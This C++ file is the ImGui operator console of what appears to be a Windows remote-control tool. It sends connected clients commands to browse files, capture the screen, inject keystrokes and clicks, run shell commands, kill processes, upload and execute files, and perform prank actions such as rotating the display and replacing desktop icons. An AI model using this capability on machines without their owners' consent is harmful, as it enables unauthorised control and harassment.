    ImGui::SetCursorScreenPos(ImVec2(p0.x + 16, p0.y + 11));
    const char* labels[] = {"Files", "System", "Screen", "Execute", "Processes", "Tools", "Message", "Fun"};
    const ImVec4* accs[] = {&DS::Accent, &DS::Purple, &DS::Orange, &DS::Green, &DS::Red, &DS::Yellow, &DS::Accent, &DS::Red};
    for (int i = 0; i < 8; i++) {
        if (i > 0) ImGui::SameLine(0, 4);
        if (navPill(labels[i], g_tab == i, *accs[i])) g_tab = i;
    }

    // Right: target indicator
    if (g_connected && g_selectedClient != 0) {
        std::lock_guard<std::mutex> lk(g_clientMutex);
        const char* nm = "?";
        for (auto& c : g_clients) if (c.id == g_selectedClient) { nm = c.name.c_str(); break; }
        // Dot + text
        ImVec2 rp(p0.x + w - 16, p0.y + h * 0.5f);
        char info[128]; snprintf(info, sizeof(info), "%s  #%u", nm, g_selectedClient);
        ImVec2 ts = ImGui::CalcTextSize(info);
        dl->AddCircleFilled(ImVec2(rp.x - ts.x - 8, rp.y), 4,
            ImGui::ColorConvertFloat4ToU32(DS::Green));
        ImGui::SetCursorScreenPos(ImVec2(rp.x - ts.x, rp.y - ts.y * 0.5f));
        ImGui::TextColored(DS::T2, "%s", info);
    } else {
        const char* msg = g_connected ? "Select a client" : "Not connected";
        ImVec2 ts = ImGui::CalcTextSize(msg);
        ImGui::SetCursorScreenPos(ImVec2(p0.x + w - ts.x - 16, p0.y + (h - ts.y) * 0.5f));
        ImGui::TextColored(DS::T3, "%s", msg);
    }
    ImGui::SetCursorScreenPos(ImVec2(p0.x, p0.y + h));
}

// ═══════════════════════════════════════════════════════════════════
//  TAB: Browse Files
// ═══════════════════════════════════════════════════════════════════
static void drawFiles(float w) {
    // ── Toolbar row ──
    ImGui::PushItemWidth(w - 290);
    bool enter = ImGui::InputTextWithHint("##path", "C:\\Users\\...", g_browsePath,
        sizeof(g_browsePath), ImGuiInputTextFlags_EnterReturnsTrue);
    ImGui::PopItemWidth();
    ImGui::SameLine(0, 6);
    if (ctaBtn("Browse", DS::Accent, ImVec2(90, 38)) || enter) sendBrowseFiles();
    ImGui::SameLine(0, 4);
    if (ghostBtn("Up", ImVec2(60, 38))) {
        std::string p(g_browsePath);
        if (!p.empty() && p.back() == '\\') p.pop_back();
        size_t pos = p.find_last_of('\\');
        if (pos != std::string::npos) {
            if (pos == 2 && p[1] == ':') p = p.substr(0, 3);
            else p = p.substr(0, pos);
            strncpy(g_browsePath, p.c_str(), sizeof(g_browsePath) - 1);
            g_browsePath[sizeof(g_browsePath) - 1] = 0;
            sendBrowseFiles();
        }
    }
    ImGui::SameLine(0, 4);
    if (ghostBtn("Refresh", ImVec2(80, 38))) sendBrowseFiles();

    ImGui::Dummy(ImVec2(0, 12));

    if (g_browseWait) {
        emptyState(nullptr, nullptr, w);
        loadingDots(w);
    } else if (g_browseReady) {
        std::lock_guard<std::mutex> lk(g_browseMutex);
        auto* dl = ImGui::GetWindowDrawList();
        ImGui::BeginChild("##fl", ImVec2(w, ImGui::GetContentRegionAvail().y), true);

        // Header
        {
            ImVec2 hp = ImGui::GetCursorScreenPos();
            dl->AddRectFilled(hp, ImVec2(hp.x + ImGui::GetContentRegionAvail().x, hp.y + 28),
                ImGui::ColorConvertFloat4ToU32(DS::Card), 6);
            ImGui::SetCursorPosX(14); ImGui::TextColored(DS::T3, "Name");
            ImGui::SameLine(w - 110);
            ImGui::TextColored(DS::T3, "Size");
            ImGui::Dummy(ImVec2(0, 4));
        }

        for (int i = 0; i < (int)g_browseResults.size(); i++) {
            auto& e = g_browseResults[i];
            ImGui::PushID(i);
            ImVec2 rp = ImGui::GetCursorScreenPos();
            if (i % 2 == 0)
                dl->AddRectFilled(rp, ImVec2(rp.x + ImGui::GetContentRegionAvail().x, rp.y + 26),
                    ImGui::ColorConvertFloat4ToU32(DS::Card), 4);

            ImGui::SetCursorPosX(14);
            if (e.isDir) ImGui::TextColored(DS::Accent, ">");
            else ImGui::TextColored(DS::T3, ".");
            ImGui::SameLine(30);

            if (ImGui::Selectable(e.name.c_str(), false, ImGuiSelectableFlags_AllowDoubleClick,
                ImVec2(ImGui::GetContentRegionAvail().x - 90, 26))) {
                if (ImGui::IsMouseDoubleClicked(0) && e.isDir) {
                    if (e.name == "..") {
                        std::string p(g_browsePath);
                        if (!p.empty() && p.back() == '\\') p.pop_back();
                        size_t pos = p.find_last_of('\\');
                        if (pos != std::string::npos) {
                            if (pos == 2 && p[1] == ':') p = p.substr(0, 3);
                            else p = p.substr(0, pos);
                            strncpy(g_browsePath, p.c_str(), sizeof(g_browsePath) - 1);
                            g_browsePath[sizeof(g_browsePath) - 1] = 0;
                            sendBrowseFiles();
                        }
                    } else {
                        std::string np = g_browsePath;
                        if (!np.empty() && np.back() != '\\') np += '\\';
                        np += e.name;
                        strncpy(g_browsePath, np.c_str(), sizeof(g_browsePath) - 1);
                        g_browsePath[sizeof(g_browsePath) - 1] = 0;
                        sendBrowseFiles();
                    }
                }
            }
            if (!e.isDir) {
                ImGui::SameLine(w - 110);
                ImGui::TextColored(DS::T3, "%s", formatSize(e.size).c_str());
            }
            ImGui::PopID();
        }
        ImGui::EndChild();
    } else {
        emptyState("Enter a path and click Browse", "to view files on the remote client", w);
    }
}

// ═══════════════════════════════════════════════════════════════════
//  TAB: System Info
// ═══════════════════════════════════════════════════════════════════
static void drawSysInfo(float w) {
    // CTA at top
    if (ctaBtn("Get System Info", DS::Purple, ImVec2(160, 38)))
        sendSystemInfo();

    ImGui::Dummy(ImVec2(0, 12));

    if (g_sysWait) {
        loadingDots(w);
    } else if (g_sysReady) {
        std::lock_guard<std::mutex> lk(g_sysMutex);
        ImGui::PushStyleColor(ImGuiCol_ChildBg, DS::Card);
        ImGui::BeginChild("##si", ImVec2(w, ImGui::GetContentRegionAvail().y), true);
        ImGui::Dummy(ImVec2(0, 6));
        const char* s = g_sysInfo.c_str();
        const char* e = s + g_sysInfo.size();
        while (s < e) {
            const char* nl = strchr(s, '\n'); if (!nl) nl = e;
            std::string line(s, nl);
            size_t col = line.find(':');
            ImGui::SetCursorPosX(16);
            if (col != std::string::npos) {
                ImGui::TextColored(DS::Purple, "%.*s", (int)col, line.c_str());
                ImGui::SameLine(0, 0);
                ImGui::TextColored(DS::T3, ":");
                ImGui::SameLine(0, 0);
                ImGui::TextColored(DS::T1, "%s", line.c_str() + col + 1);
            } else {
                ImGui::TextUnformatted(line.c_str());
            }
            s = (nl < e) ? nl + 1 : e;
        }
        ImGui::EndChild();
        ImGui::PopStyleColor();
    } else {
        emptyState("Click 'Get System Info' above", "to retrieve hardware information", w);
    }
}

// ═══════════════════════════════════════════════════════════════════
//  TAB: View Screen
// ═══════════════════════════════════════════════════════════════════
static void drawScreen(float w) {
    // CTA row
    if (ctaBtn("Capture", DS::Orange, ImVec2(110, 38)))
        sendViewScreen();
    ImGui::SameLine(0, 16);
    ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 4);
    ImGui::Checkbox("Auto-refresh", &g_autoRefresh);
    if (g_autoRefresh) {
        ImGui::SameLine(0, 12);
        ImGui::PushItemWidth(100);
        ImGui::SliderFloat("##iv", &g_refreshInterval, 0.2f, 10.0f, "%.1fs");
        ImGui::PopItemWidth();
    }
    ImGui::SameLine(0, 16);
    ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 4);
    ImGui::TextColored(DS::T3, "Rotate:");
    if (ghostBtn("0°", ImVec2(40, 34))) sendRotateScreen(0);
    ImGui::SameLine(0, 2);
    if (ghostBtn("90°", ImVec2(40, 34))) sendRotateScreen(90);
    ImGui::SameLine(0, 2);
    if (ghostBtn("180°", ImVec2(50, 34))) sendRotateScreen(180);
    ImGui::SameLine(0, 2);
    if (ghostBtn("270°", ImVec2(50, 34))) sendRotateScreen(270);

    // Key input bar
    ImGui::Dummy(ImVec2(0, 8));
    ImGui::TextColored(DS::T3, "Type text on remote screen:");
    ImGui::PushItemWidth(w - 100);
    bool keyEnter = ImGui::InputTextWithHint("##ki", "Type and press Enter to send keystrokes...",
        g_keyInput, sizeof(g_keyInput), ImGuiInputTextFlags_EnterReturnsTrue);
    ImGui::PopItemWidth();
    ImGui::SameLine(0, 8);
    if (ctaBtn("Send", DS::Accent, ImVec2(80, 34)) || keyEnter) {
        sendKeyInput(std::string(g_keyInput));
        g_keyInput[0] = 0;
    }

    // Drawing tools
    ImGui::Dummy(ImVec2(0, 8));
    ImGui::TextColored(DS::T3, "Draw on remote screen:");
    ImGui::SameLine(0, 12);
    ImGui::Checkbox("Draw mode", &g_drawing);
    if (g_drawing) {
        ImGui::SameLine(0, 12);
        ImGui::PushItemWidth(120);
        ImGui::ColorEdit3("##dc", &g_drawR, ImGuiColorEditFlags_NoInputs);
        ImGui::SameLine(0, 8);
        ImGui::SliderInt("##ds", &g_drawSize, 1, 30, "Size %d");
        ImGui::PopItemWidth();
        ImGui::SameLine(0, 8);
        if (ghostBtn("Clear", ImVec2(70, 28))) sendClearDraw();
    }

    ImGui::Dummy(ImVec2(0, 8));

    float ah = ImGui::GetContentRegionAvail().y;
    if (g_screenWait && !g_screenTexture) {
        loadingDots(w);
    } else if (g_screenTexture) {
        float sc = 1.0f;
        if (g_screenTexW > 0 && g_screenTexH > 0)
            sc = (w / g_screenTexW < ah / g_screenTexH) ? w / g_screenTexW : ah / g_screenTexH;
        ImVec2 sz(g_screenTexW * sc, g_screenTexH * sc);
        float ox = (w - sz.x) * 0.5f;
        if (ox > 0) ImGui::SetCursorPosX(ImGui::GetCursorPosX() + ox);

        ImGui::Image((ImTextureID)g_screenTexture, sz);

        ImVec2 imgMin = ImGui::GetItemRectMin();
        if (ImGui::IsItemHovered()) {
            ImVec2 mp = ImGui::GetMousePos();
            int cx = (int)((mp.x - imgMin.x) / sc);
            int cy = (int)((mp.y - imgMin.y) / sc);

            if (g_drawing) {
                uint8_t rcol = (uint8_t)(g_drawR * 255);
                uint8_t gcol = (uint8_t)(g_drawG * 255);
                uint8_t bcol = (uint8_t)(g_drawB * 255);

                // Stroke started this frame
                if (ImGui::IsMouseClicked(0)) {
                    g_drawStrokeDown = true;
                    g_drawLastX = cx; g_drawLastY = cy;
                    g_drawLocalPath.clear();
                    g_drawLocalPath.emplace_back(cx, cy);
                    g_drawLocalColor = IM_COL32(rcol, gcol, bcol, 255);
                    g_drawLocalSize = g_drawSize;
                    // Wire-side: marker-down — client adds a fresh stroke anchor.
                    sendDraw(0, cx, cy, rcol, gcol, bcol, g_drawSize);
                } else if (ImGui::IsMouseDown(0) && g_drawStrokeDown) {
                    // Drag — issue a line segment from previous anchor to current
                    // position. Even if cx==lastX && cy==lastY and we skipped
                    // a frame, the overlay's persistent stroke storage guarantees
                    // a continuous ink with no gap between frames.
                    int dx = cx - g_drawLastX, dy = cy - g_drawLastY;
                    bool moved = (dx*dx + dy*dy) >= 1;
                    if (moved) {
                        // Wire-side: LineTo from previous anchor to current.
                        // The x/y we send are image-pixel coords so the client
                        // draws exactly where the user sees the cursor.
                        sendDraw(2, cx, cy, rcol, gcol, bcol, g_drawSize);
                        g_drawLastX = cx; g_drawLastY = cy;
                        g_drawLocalPath.emplace_back(cx, cy);
                    }
                }
                if (ImGui::IsMouseReleased(0)) {
                    // Mouse up: end of stroke. We DO NOT touch g_drawing —
                    // pen stays armed so the user can immediately start another
                    // stroke without re-checking the box. The on-screen ink
                    // stays where it was drawn, only cleared by Clear button.
                    g_drawStrokeDown = false;
                    g_drawLastX = g_drawLastY = -1;
                }

                // Local preview — render the path that hasn't yet been ack'd
                // to the client. This guarantees what the user sees on their
                // screen lines up byte-for-byte with what the client will draw,
                // closing the visual gap entirely.
                if (!g_drawLocalPath.empty()) {
                    auto* dl = ImGui::GetWindowDrawList();
                    ImVec2 a(imgMin.x + g_drawLocalPath.front().first * sc,
                             imgMin.y + g_drawLocalPath.front().second * sc);
                    for (size_t i = 1; i < g_drawLocalPath.size(); i++) {
                        ImVec2 b(imgMin.x + g_drawLocalPath[i].first * sc,
                                 imgMin.y + g_drawLocalPath[i].second * sc);
                        dl->AddLine(a, b, g_drawLocalColor, (float)g_drawLocalSize);
                        a = b;
                    }
                }
            } else {
                // Click mode
                if (ImGui::IsMouseClicked(0)) {
                    sendMouseClick(cx, cy, 0);
                    if (g_autoRefresh) g_refreshTimer = g_refreshInterval;
                }
                if (ImGui::IsMouseClicked(1)) {
                    sendMouseClick(cx, cy, 1);
                    if (g_autoRefresh) g_refreshTimer = g_refreshInterval;
                }
                if (ImGui::IsMouseDoubleClicked(0)) {
                    sendMouseClick(cx, cy, 2);
                    if (g_autoRefresh) g_refreshTimer = g_refreshInterval;
                }
            }
        }
        ImGui::TextColored(DS::T3, "  %s",
            g_drawing ? "Draw mode: hold left mouse to draw on screen | remote ink persists until Clear" :
                        "Click = left | Right-click = right | Double = double-click");
    } else {
        emptyState("Click 'Capture' above", "then click on the image to interact", w);
    }
}

// ═══════════════════════════════════════════════════════════════════
//  TAB: Execute
// ═══════════════════════════════════════════════════════════════════
static void drawExec(float w) {
    // CTA row
    ImGui::PushItemWidth(w - 110);
    bool enter = ImGui::InputTextWithHint("##cmd", "whoami, ipconfig, dir, systeminfo...",
        g_execCmd, sizeof(g_execCmd), ImGuiInputTextFlags_EnterReturnsTrue);
    ImGui::PopItemWidth();
    ImGui::SameLine(0, 8);
    if (ctaBtn("Run", DS::Green, ImVec2(90, 38)) || enter)
        sendExecute();

    ImGui::Dummy(ImVec2(0, 12));

    if (g_execWait) {
        loadingDots(w);
    } else if (g_execReady) {
        std::lock_guard<std::mutex> lk(g_execMutex);
        // Terminal-like output
        ImGui::PushStyleColor(ImGuiCol_ChildBg, ImVec4(0.02f, 0.02f, 0.03f, 1.0f));
        ImGui::BeginChild("##out", ImVec2(w, ImGui::GetContentRegionAvail().y), true);
        ImGui::Dummy(ImVec2(0, 6));
        ImGui::SetCursorPosX(12);
        ImGui::TextColored(DS::Green, "$ %s", g_execCmd);
        ImGui::Dummy(ImVec2(0, 2));
        { ImVec2 sp = ImGui::GetCursorScreenPos();
          ImGui::GetWindowDrawList()->AddLine(ImVec2(sp.x, sp.y), ImVec2(sp.x + w - 16, sp.y),
            ImGui::ColorConvertFloat4ToU32(DS::Border)); }
        ImGui::Dummy(ImVec2(0, 8));
        ImGui::SetCursorPosX(12);
        ImGui::PushStyleColor(ImGuiCol_Text, DS::T1);
        ImGui::TextUnformatted(g_execOutput.c_str());
        ImGui::PopStyleColor();
        ImGui::EndChild();
        ImGui::PopStyleColor();
    } else {
        emptyState("Enter a command and click Run", "or press Enter in the input field", w);
    }
}

// ═══════════════════════════════════════════════════════════════════
//  TAB: Processes
// ═══════════════════════════════════════════════════════════════════
static void drawProcesses(float w) {
    if (ctaBtn("Refresh", DS::Accent, ImVec2(100, 38)))
        sendProcessList();
    ImGui::SameLine(0, 12);
    ImGui::SetCursorPosY(ImGui::GetCursorPosY() + 4);
    ImGui::PushItemWidth(200);
    ImGui::InputTextWithHint("##pf", "Filter processes...", g_procFilter, sizeof(g_procFilter));
    ImGui::PopItemWidth();

    ImGui::Dummy(ImVec2(0, 8));

    if (g_procWait) {
        loadingDots(w);
    } else if (g_procReady) {
        std::lock_guard<std::mutex> lk(g_procMutex);
        auto* dl = ImGui::GetWindowDrawList();

        ImGui::BeginChild("##pl", ImVec2(w, ImGui::GetContentRegionAvail().y), true);

        // Header
        {
            ImVec2 hp = ImGui::GetCursorScreenPos();
            dl->AddRectFilled(hp, ImVec2(hp.x + ImGui::GetContentRegionAvail().x, hp.y + 28),
                ImGui::ColorConvertFloat4ToU32(DS::Card), 6);
            ImGui::SetCursorPosX(14); ImGui::TextColored(DS::T3, "PID");
            ImGui::SameLine(100);
            ImGui::TextColored(DS::T3, "Process Name");
            ImGui::SameLine(w - 80);
            ImGui::TextColored(DS::T3, "Action");
            ImGui::Dummy(ImVec2(0, 4));
        }

        int shown = 0;
        for (int i = 0; i < (int)g_procList.size(); i++) {
            auto& p = g_procList[i];
            // Filter
            if (g_procFilter[0] != 0) {
                char lower[260];
                strncpy(lower, p.name.c_str(), sizeof(lower) - 1);
                lower[sizeof(lower) - 1] = 0;
                // Simple case-insensitive search
                char filterLower[128];
                strncpy(filterLower, g_procFilter, sizeof(filterLower) - 1);
                filterLower[sizeof(filterLower) - 1] = 0;
                // Check if filter matches
                bool match = false;
                for (int j = 0; lower[j]; j++) lower[j] = tolower(lower[j]);
                for (int j = 0; filterLower[j]; j++) filterLower[j] = tolower(filterLower[j]);
                if (strstr(lower, filterLower)) match = true;
                if (!match) continue;
            }
            shown++;

            ImGui::PushID(i);
            ImVec2 rp = ImGui::GetCursorScreenPos();
            if (shown % 2 == 0)
                dl->AddRectFilled(rp, ImVec2(rp.x + ImGui::GetContentRegionAvail().x, rp.y + 26),
                    ImGui::ColorConvertFloat4ToU32(DS::Card), 4);

            ImGui::SetCursorPosX(14);
            ImGui::TextColored(DS::T2, "%u", p.pid);
            ImGui::SameLine(100);
            ImGui::TextColored(DS::T1, "%s", p.name.c_str());

            // Kill button on right
            ImGui::SameLine(w - 80);
            ImGui::PushStyleColor(ImGuiCol_Text, DS::Red);
            ImGui::PushStyleColor(ImGuiCol_Button, DS::RedBg);
            ImGui::PushStyleColor(ImGuiCol_ButtonHovered, DS::Red);
            ImGui::PushStyleColor(ImGuiCol_ButtonActive, DS::Red);
            char btnLabel[32]; snprintf(btnLabel, sizeof(btnLabel), "Kill##%u", p.pid);
            if (ImGui::SmallButton(btnLabel)) {
                sendKillProcess(p.pid);
            }
            ImGui::PopStyleColor(4);

            // Right-click context menu
            if (ImGui::BeginPopupContextItem(("##ctx%d" + std::to_string(i)).c_str())) {
                if (ImGui::Selectable("Kill Process")) sendKillProcess(p.pid);
                ImGui::EndPopup();
            }

            ImGui::PopID();
        }
        ImGui::EndChild();
        ImGui::TextColored(DS::T3, "  Showing %d of %u processes", shown, (unsigned)g_procList.size());
    } else {
        emptyState("Click 'Refresh' above", "to list running processes on the client", w);
    }
}

// ═══════════════════════════════════════════════════════════════════
//  TAB: Tools (File Upload + Run File)
// ═══════════════════════════════════════════════════════════════════
static void drawTools(float w) {
    // ── File Upload section ──
    label("UPLOAD FILE TO CLIENT");
    ImGui::PushItemWidth(w - 120);
    ImGui::InputTextWithHint("##up", "  C:\\path\\to\\file.exe", g_uploadPath, sizeof(g_uploadPath));
    ImGui::PopItemWidth();
    ImGui::SameLine(0, 8);
    if (ctaBtn("Upload", DS::Accent, ImVec2(100, 38)))
        sendFileUpload(std::string(g_uploadPath));

    ImGui::Dummy(ImVec2(0, 16));

    // ── Run File section ──
    label("RUN FILE ON CLIENT");
    ImGui::PushItemWidth(w - 120);
    bool runEnter = ImGui::InputTextWithHint("##rf", "  C:\\Temp\\file.exe  (or path from upload result)",
        g_runPath, sizeof(g_runPath), ImGuiInputTextFlags_EnterReturnsTrue);
    ImGui::PopItemWidth();
    ImGui::SameLine(0, 8);
    if (ctaBtn("Run", DS::Green, ImVec2(100, 38)) || runEnter)
        sendRunFile(std::string(g_runPath));

    ImGui::Dummy(ImVec2(0, 24));
    ImGui::TextColored(DS::T3, "  Tip: Upload a file, check the Activity Log for the saved path,");
    ImGui::TextColored(DS::T3, "  then paste that path into 'Run File' to execute it remotely.");
}

// ═══════════════════════════════════════════════════════════════════
//  TAB: Message — Send alerts to client
// ═══════════════════════════════════════════════════════════════════
static void drawMessage(float w) {
    label("MESSAGE TYPE");
    ImGui::Dummy(ImVec2(0, 4));

    // Type selector
    if (ImGui::RadioButton("  Info", g_msgType == 0)) g_msgType = 0; ImGui::SameLine(0, 16);
    if (ImGui::RadioButton("  Warning", g_msgType == 1)) g_msgType = 1; ImGui::SameLine(0, 16);
    if (ImGui::RadioButton("  Error", g_msgType == 2)) g_msgType = 2;

    ImGui::Dummy(ImVec2(0, 12));

    label("MESSAGE TEXT");
    ImGui::PushItemWidth(w - 120);
    bool msgEnter = ImGui::InputTextWithHint("##msg", "Enter message to display on client screen...",
        g_msgText, sizeof(g_msgText), ImGuiInputTextFlags_EnterReturnsTrue);
    ImGui::PopItemWidth();
    ImGui::SameLine(0, 8);

    ImVec4 btnCol = DS::Accent;
    const char* btnLabel = "  Send  ";
    if (g_msgType == 1) { btnCol = DS::Yellow; btnLabel = "  Warn  "; }
    if (g_msgType == 2) { btnCol = DS::Red;    btnLabel = "  Error  "; }
    if (ctaBtn(btnLabel, btnCol, ImVec2(100, 38)) || msgEnter) {
        sendMessage();
        g_msgText[0] = 0;
    }

    ImGui::Dummy(ImVec2(0, 16));
    ImGui::TextColored(DS::T3, "  The message will appear as a popup MessageBox on the client.");
    ImGui::TextColored(DS::T3, "  Info = blue icon | Warning = yellow icon | Error = red icon");
}

// ═══════════════════════════════════════════════════════════════════
//  TAB: Fun — Rotate screen, wallpaper, icon chaos
// ═══════════════════════════════════════════════════════════════════
static void drawFun(float w) {
    // ── Section: Rotate Screen ──
    label("ROTATE SCREEN (REMOTE PC DISPLAY)");

    ImGui::Dummy(ImVec2(0, 6));
    ImGui::SetCursorPosX(12);

    // Angle buttons
    if (ctaBtn("  0\u00B0  Normal", g_screenAngle == 0 ? DS::Accent : DS::Card, ImVec2(120, 38))) {
        g_screenAngle = 0;
        sendRotateScreen(0);
    }
    ImGui::SameLine(0, 6);
    if (ctaBtn("  90\u00B0",  g_screenAngle == 90  ? DS::Accent : DS::Card, ImVec2(80, 38))) {
        g_screenAngle = 90;
        sendRotateScreen(90);
    }
    ImGui::SameLine(0, 6);
    if (ctaBtn("  180\u00B0", g_screenAngle == 180 ? DS::Accent : DS::Card, ImVec2(80, 38))) {
        g_screenAngle = 180;
        sendRotateScreen(180);
    }
    ImGui::SameLine(0, 6);
    if (ctaBtn("  270\u00B0", g_screenAngle == 270 ? DS::Accent : DS::Card, ImVec2(80, 38))) {
        g_screenAngle = 270;
        sendRotateScreen(270);
    }

    ImGui::Dummy(ImVec2(0, 6));
    ImGui::TextColored(DS::T3, "  Reboots display driver. Physical screen will rotate.");
    ImGui::TextColored(DS::T3, "  Save any open work before rotating.");

    // ── Section: Wallpaper ──
    ImGui::Dummy(ImVec2(0, 18));
    label("SET WALLPAPER ON REMOTE DESKTOP");

    ImGui::Dummy(ImVec2(0, 6));
    ImGui::SetCursorPosX(12);
    ImGui::PushItemWidth(w - 200);
    ImGui::InputTextWithHint("##wppath",
        "  C:\\path\\to\\wallpaper.jpg  (or PNG, BMP \u2014 max 1MB)",
        g_wallpaperPath, sizeof(g_wallpaperPath));
    ImGui::PopItemWidth();
    ImGui::SameLine(0, 8);
    if (ctaBtn("  Set WP  ", DS::Purple, ImVec2(110, 38)))
        sendSetWallpaper(std::string(g_wallpaperPath));

    ImGui::Dummy(ImVec2(0, 6));
    ImGui::TextColored(DS::T3, "  Image is uploaded and applied as the desktop background.");
    ImGui::TextColored(DS::T3, "  Saved to %USERPROFILE%\\wallpaper_remote.jpg");

    // ── Section: Replace Desktop Icons ──
    ImGui::Dummy(ImVec2(0, 18));
    label("REPLACE ALL DESKTOP ICONS");

    ImGui::Dummy(ImVec2(0, 6));
    ImGui::SetCursorPosX(12);
    ImGui::PushItemWidth(w - 200);
    ImGui::InputTextWithHint("##iconpath",
        "  C:\\path\\to\\icon.ico  (or .exe / .dll containing icons)",
        g_iconPath, sizeof(g_iconPath));
    ImGui::PopItemWidth();
    ImGui::SameLine(0, 8);
    if (ctaBtn("  Replace  ", DS::Orange, ImVec2(110, 38)))
        sendReplaceIcons(std::string(g_iconPath));

    ImGui::Dummy(ImVec2(0, 6));
    ImGui::TextColored(DS::T3, "  Replaces the icon of EVERY .lnk shortcut on the desktop.");
    ImGui::TextColored(DS::T3, "  Point to a .ico file, or an .exe/.dll with embedded icons.");
    ImGui::TextColored(ImVec4(0.7f, 0.5f, 0.2f, 1),
        "  WARNING: desktop icons will change globally. Refresh desktop to see.");
}

// ═══════════════════════════════════════════════════════════════════
//  LOG PANEL
// ═══════════════════════════════════════════════════════════════════
static void drawLog(float w, float h) {
    ImGui::PushStyleColor(ImGuiCol_ChildBg, DS::BgSide);
    ImGui::BeginChild("##log", ImVec2(w, h), true);
    ImGui::SetCursorPosX(16); ImGui::SetCursorPosY(8);
    ImGui::TextColored(DS::T3, "ACTIVITY LOG");
    ImGui::SameLine(w - 50);
    ImGui::SetCursorPosY(8);
    ImGui::TextColored(DS::T3, "%d", g_logCount);
    ImGui::Separator();
    ImGui::Dummy(ImVec2(0, 2));
    ImGui::PushStyleVar(ImGuiStyleVar_ItemSpacing, ImVec2(0, 3));
    {
        std::lock_guard<std::mutex> lk(g_logMutex);
        for (int i = 0; i < g_logCount; i++) {
            int idx = (g_logHead - g_logCount + i + 200) % 200;
            ImGui::SetCursorPosX(16);
            ImGui::TextColored(g_log[idx].color, "%s", g_log[idx].text.c_str());
        }
        if (g_logDirty) { ImGui::SetScrollHereY(1.0f); g_logDirty = false; }
    }
    ImGui::PopStyleVar();
    ImGui::EndChild();
    ImGui::PopStyleColor();
}

// ═══════════════════════════════════════════════════════════════════
//  MAIN DRAW
// ═══════════════════════════════════════════════════════════════════
static void onDraw() {
    ImGuiIO& io = ImGui::GetIO();
    g_animTime += io.DeltaTime;

    PollProtection();

    // Click sound
    if (ImGui::IsMouseClicked(0))
        PlaySoundW(L"click.wav", nullptr, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);

    // Screen capture decode
    bool ns = false;
    { std::lock_guard<std::mutex> lk(g_screenMutex); ns = g_screenReady; if (ns) g_screenReady = false; }
    if (ns) {
        std::vector<uint8_t> j;
        { std::lock_guard<std::mutex> lk(g_screenMutex); j = g_screenJpeg; }
        if (g_screenTexture) { imguiReleaseTexture(g_screenTexture); g_screenTexture = 0; }
        if (j.size() > 100) {
            std::vector<uint8_t> rgba;
            if (decodeJpeg(j.data(), j.size(), rgba, g_screenTexW, g_screenTexH))
                g_screenTexture = imguiCreateTextureRGBA(rgba.data(), g_screenTexW, g_screenTexH);
            else addLog("[!] Decode failed");
        } else if (!j.empty()) {
            std::string e(j.begin(), j.end());
            addLog("[!] Client: %s", e.c_str());
        }
    }

    // Auto-refresh
    if (g_autoRefresh && g_connected && g_selectedClient != 0) {
        g_refreshTimer += io.DeltaTime;
        if (g_refreshTimer >= g_refreshInterval) { g_refreshTimer = 0; sendViewScreen(); }
    }

    // Fullscreen
    ImGui::SetNextWindowPos(ImVec2(0, 0));
    ImGui::SetNextWindowSize(io.DisplaySize);
    ImGui::Begin("##main", nullptr,
        ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize |
        ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoCollapse |
        ImGuiWindowFlags_NoBringToFrontOnFocus | ImGuiWindowFlags_NoScrollbar);

    float sideW = 240, logH = 130, navH = 56;
    float contentW = io.DisplaySize.x - sideW;

    // Sidebar
    ImGui::PushStyleColor(ImGuiCol_ChildBg, DS::BgSide);
    drawSidebar(sideW);
    ImGui::PopStyleColor();

    // Right panel
    ImGui::SameLine();
    ImGui::BeginChild("##right", ImVec2(contentW, io.DisplaySize.y));

    // Nav
    drawNav(contentW);

    // Tab content
    float tabW = contentW - 32;
    ImGui::SetCursorPosX(16);
    ImGui::SetCursorPosY(navH + 12);
    ImGui::BeginChild("##tc", ImVec2(contentW, io.DisplaySize.y - navH - logH - 12), false);
    switch (g_tab) {
        case 0: drawFiles(tabW);      break;
        case 1: drawSysInfo(tabW);    break;
        case 2: drawScreen(tabW);     break;
        case 3: drawExec(tabW);       break;
        case 4: drawProcesses(tabW);  break;
        case 5: drawTools(tabW);      break;
        case 6: drawMessage(tabW);    break;
        case 7: drawFun(tabW);        break;
    }
    ImGui::EndChild();

    // Log
    drawLog(contentW, logH);
    ImGui::EndChild();
    ImGui::End();
}

// ═══════════════════════════════════════════════════════════════════
//  ENTRY
// ═══════════════════════════════════════════════════════════════════
int main() {
    InitializeProtection();
    Gdiplus::GdiplusStartupInput gi;
    Gdiplus::GdiplusStartup(&g_gdiplusToken, &gi, nullptr);
    ws::init();
    int r = imguiRun(L"Server - Remote Control", 1100, 750, []() {
        applyStyle();
        // Auto-connect if SERVER_AUTOCONNECT env var set
        const char* env = std::getenv("SERVER_AUTOCONNECT");
        if (env && env[0] == '1' && !g_connected) {
            doConnect();
        }
    }, onDraw);
    if (g_connected) doDisconnect();
    if (g_screenTexture) imguiReleaseTexture(g_screenTexture);
    Gdiplus::GdiplusShutdown(g_gdiplusToken);
    ws::shutdown();
    return r;
}
